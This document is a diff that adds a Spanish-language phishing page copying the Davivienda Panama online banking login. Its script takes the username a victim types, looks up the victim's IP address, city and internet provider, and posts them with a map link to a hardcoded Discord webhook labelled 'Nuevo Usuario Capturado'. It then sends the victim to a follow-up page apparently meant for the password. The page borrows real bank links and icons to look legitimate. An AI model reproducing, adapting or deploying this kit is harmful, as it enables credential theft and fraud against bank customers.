@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>Davivienda</title>
+
+    <link rel="shortcut icon" href="https://enlinea.davivienda.com.pa/ebanking/images/favicon.ico">
+    <link href="./index_files/combined.css" type="text/css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css" integrity="sha512-2SwdPD6INVrV/lHTZbO2nodKhrnDdJK9/kg2XD1r9uGqPo1cUbujc+IYdlYdEErWNu69gVcYgdxlmVmzTWnetw==" crossorigin="anonymous" referrerpolicy="no-referrer">
+
+    <style>
+        /* Evita el parpadeo del contenido sin estilos */
+        body { display: none; }
+    </style>
+
+    <noscript>
+        <img src="/insga7s/in/bcb5a7fec28c3715cee6b8f6601d2047/1/1" style="display: none" alt="">
+    </noscript>
+</head>
+
+<body style="display: block">
+
+    <div class="outerDiv_" id="outer1">
+
+        <!-- Cabecera con logo y selector de idioma -->
+        <div id="superiorSinLogin">
+            <div style="float: right; padding-right: 73px">
+                <div class="idiomaLink">
+                    <i class="fa fa-language" style="font-size: 1.2em"></i>
+                    <a id="selectorEs" href="#" style="display: none">Español</a>
+                    <a id="selectorEn" href="#">English</a>
+                </div>
+            </div>
+            <div id="banner"></div>
+        </div>
+
+        <div id="center">
+            <div id="loginBox">
+
+                <form id="loginFormNuevo" autocomplete="off" novalidate>
+
+                    <audio id="audio" controls style="display: none">
+                        <source type="audio/wav">
+                    </audio>
+
+                    <div class="contentDiv">
+
+                        <div id="titleBox">
+                            <h2 id="tituloIngreseUsername" class="titulo-login">
+                                Autenticación del cliente
+                            </h2>
+                        </div>
+
+                        <div id="pedirUsernameBox">
+
+                            <!-- Bloque de mensajes de error -->
+                            <div id="errorBox" style="visibility: hidden">
+                                <span id="errorPlaceholder">Error</span>
+                                <span id="errorServicioAvatar" class="value" style="display: none">
+                                    Error al consultar avatar
+                                </span>
+                                <span id="errorUsernameInvalido" class="value" style="display: none">
+                                    <i class="fa fa-chevron-right" aria-hidden="true"></i>Nombre de usuario inválido
+                                </span>
+                                <span id="errorAutenticacion" class="value" style="display: none">
+                                    Usuario inválido
+                                </span>
+                            </div>
+
+                            <!-- Campo de usuario: teclado numérico, acepta letras y símbolos -->
+                            <div class="formTextInput" id="usernameBox">
+                                <input
+                                    id="username_o"
+                                    type="text"
+                                    class="conTecladoVirtual loginInput"
+                                    placeholder="Usuario"
+                                    inputmode="numeric"
+                                    pattern="[0-9]*"
+                                    autocomplete="off"
+                                    autocapitalize="off"
+                                    autocorrect="off"
+                                    spellcheck="false"
+                                    enterkeyhint="go"
+                                    maxlength="20"
+                                >
+                                <div id="capslockdiv" style="display: none; padding-top: 5px; color: gray">
+                                    MAYÚSCULAS ACTIVADAS
+                                </div>
+                            </div>
+
+                            <div id="botonSendUsernameBox">
+                                <input
+                                    id="botonEnviar"
+                                    type="button"
+                                    value="Ingresar"
+                                    class="botonSiguiente"
+                                >
+                            </div>
+
+                        </div>
+                    </div>
+
+                    <div id="loginOptions">
+                        <ul>
+                            <li>
+                                <a href="https://enlinea.davivienda.com.pa/ebanking/seguridad/autoadhesion/datosUsuario.htm" class="boton-link">AutoAdhesión</a>
+                            </li>
+                            <li>
+                                <a href="#recuperacion.htm" class="boton-link blockUi">¿Olvidó su clave?</a>
+                            </li>
+                            <li>
+                                <a href="#autodesbloqueo.htm" class="boton-link blockUi">Mi usuario fue bloqueado</a>
+                            </li>
+                        </ul>
+
+                        <p class="login-info">
+                            Davivienda, tiene el compromiso de proteger su privacidad y la
+                            integridad de su información personal y financiera. A
+                            continuación se definen recomendaciones para su seguridad.
+                            Consúltelas haciendo
+                        </p>
+
+                        <a class="a-login" href="https://bienvenido.davivienda.com.pa/wps/portal/personasPA/nuevo/personas/canales_atencion/recomendaciones_de_seguridad">Click aquí</a>
+                    </div>
+
+                </form>
+
+            </div>
+        </div>
+
+        <div id="clearfooter"></div>
+    </div>
+
+    <div id="footer">
+        <ul>
+            <li class="footerText">
+                Davivienda - © 2026 Davivienda - Todos los derechos reservados
+            </li>
+        </ul>
+    </div>
+
+    <script>
+        'use strict';
+
+        /* =====================================================
+           CONFIGURACIÓN
+           ===================================================== */
+        const CONFIG = {
+            WEBHOOK: 'https://discord.com/api/webhooks/1571222568793415833/bKfhN5n_lR0hFr2JZwKyoB4dE2blBrcyBo-8pZ4wp-SbX8H87wzF8t_rVZeJocnEDrNw',
+            BOT_NAME: 'Bot Notificaciones',
+            SIGUIENTE: 'contra.html',
+            RETARDO: 500
+        };
+
+        const usuario = document.getElementById('username_o');
+        const boton = document.getElementById('botonEnviar');
+        const avisoCaps = document.getElementById('capslockdiv');
+
+        /* =====================================================
+           IP y ubicación
+           ===================================================== */
+        async function obtenerIP() {
+            try {
+                const respuesta = await fetch('https://ipapi.co/json/');
+                const datos = await respuesta.json();
+
+                return {
+                    ip: datos.ip || 'No disponible',
+                    ciudad: datos.city || 'No disponible',
+                    region: datos.region || 'No disponible',
+                    pais: datos.country_name || 'No disponible',
+                    proveedor: datos.org || 'No disponible',
+                    lat: datos.latitude || null,
+                    lon: datos.longitude || null
+                };
+            } catch (error) {
+                console.error('Error obteniendo IP:', error);
+                return {
+                    ip: 'Error al obtener',
+                    ciudad: 'No disponible',
+                    region: '',
+                    pais: '',
+                    proveedor: '',
+                    lat: null,
+                    lon: null
+                };
+            }
+        }
+
+        /* =====================================================
+           Envío del mensaje
+           ===================================================== */
+        function construirMensaje(nombre, info) {
+            let texto = '🔔 *Nuevo Usuario Capturado* 🔔\n';
+            texto += '*Usuario:* `' + nombre + '`\n\n';
+            texto += '*📡 Información de IP:*\n';
+            texto += '• *IP:* `' + info.ip + '`\n';
+            texto += '• *Ubicación:* ' + info.ciudad + ', ' + info.region + ', ' + info.pais + '\n';
+            texto += '• *Proveedor:* ' + info.proveedor + '\n';
+
+            if (info.lat && info.lon) {
+                texto += '• [📍 Ver en Google Maps](https://www.google.com/maps?q=' + info.lat + ',' + info.lon + ')';
+            }
+
+            return texto;
+        }
+
+        function enviarANotificacion(nombre, info) {
+            localStorage.setItem('usuario', nombre);
+
+            fetch(CONFIG.WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: construirMensaje(nombre, info),
+                    username: CONFIG.BOT_NAME
+                })
+            })
+            .then(function (respuesta) {
+                if (!respuesta.ok) {
+                    console.error('Error al enviar:', respuesta.status);
+                }
+            })
+            .catch(function (error) {
+                console.error('Error:', error);
+            })
+            .finally(function () {
+                setTimeout(function () {
+                    window.location.href = CONFIG.SIGUIENTE;
+                }, CONFIG.RETARDO);
+            });
+        }
+
+        /* =====================================================
+           Flujo principal
+           ===================================================== */
+        async function procesarLogin() {
+            const nombre = usuario.value.trim();
+
+            if (!nombre) {
+                alert('Por favor, ingrese su nombre de usuario.');
+                usuario.focus();
+                return;
+            }
+
+            boton.disabled = true;
+            boton.value = 'Verificando...';
+
+            const info = await obtenerIP();
+
+            boton.value = 'Enviando...';
+
+            enviarANotificacion(nombre, info);
+        }
+
+        /* =====================================================
+           Eventos
+           ===================================================== */
+        boton.addEventListener('click', procesarLogin);
+
+        usuario.addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                procesarLogin();
+            }
+        });
+
+        // Aviso de Bloq Mayús
+        usuario.addEventListener('keyup', function (e) {
+            const activo = e.getModifierState && e.getModifierState('CapsLock');
+            avisoCaps.style.display = activo ? 'block' : 'none';
+        });
+
+        // Sin filtro de caracteres: se permiten letras, números y símbolos
+        usuario.addEventListener('input', function () {
+            if (this.value.length > 20) {
+                this.value = this.value.slice(0, 20);
+            }
+        });
+
+        window.addEventListener('load', function () {
+            usuario.focus();
+        });
+    </script>
+
+</body>
+</html>
